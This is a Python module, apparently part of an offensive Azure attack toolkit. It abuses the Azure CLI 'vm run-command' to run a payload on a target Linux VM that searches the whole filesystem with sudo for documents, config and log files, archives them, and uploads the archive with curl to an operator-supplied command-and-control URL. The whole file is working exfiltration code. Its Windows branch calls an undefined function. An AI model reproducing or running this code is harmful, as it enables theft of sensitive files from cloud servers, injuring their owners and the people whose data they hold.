import subprocess
import json
import os

def start(args):
	
	help_str = "usage:\n\texec exfil_file_search -rgrp resource-group -vm_name vm_name ---> will zip interesting files and exfiltrate from target vm"

	if(len(args) < 1):
		print(help_str)
		return

	if(args[0][0] == "?"):
		print(help_str)
		return
		
	if "-rgrp" not in args[0] or "-vm_name" not in args[0]:
		print("incorrect cmd parameters")
		print(help_str)
		return

	grp_ind = args[0].index("-rgrp")
	rgrp = args[0][grp_ind+1]

	name_ind = args[0].index("-vm_name")
	vm_name = args[0][name_ind+1]

	shell_stuff = subprocess.run(['az', 'vm', 'show', '-n', vm_name, '-g', rgrp, '--query', '{os_type:storageProfile.osDisk.osType}'], stdout=subprocess.PIPE)
	shell_json_obj = json.loads(shell_stuff.stdout.decode('utf-8'))

	os_type = shell_json_obj['os_type']
	

	if(os_type == "Windows"):
		print("[+] detected Windows OS, will develop soon [+]")
		c2_search(vm_name, rgrp)
		return
	else:	
		print("[+] exfiltrating... [+]")

		c2_connection(vm_name, rgrp)
		


def c2_connection(vm_name, rgrp):

	c2_url = input("what is the C2 url: ")

	payload = "sudo find / -xdev -iregex \".*\\.\\(xls\\|docx\\|txt\\|config\\|log\\)\" > allfiles && tar -cvf allfiles.tar -T allfiles && gzip allfiles.tar && chmod +r allfiles.tar.gz && curl " + c2_url + " -F \"file=@allfiles.tar.gz\""
	
	print("[+] sending payload at the target vm [+]")

	
	try:
		val = subprocess.run(['az','vm', 'run-command', 'invoke', '-g', rgrp, '-n', vm_name, '--command-id', 'RunShellScript', '--scripts', payload, '--query', 'value[].message'], stdout=subprocess.PIPE)
		print("[+] payload sent, check uploads folder [+]")
	except:
		print("[-] an error occured [-]")
		return

	
	
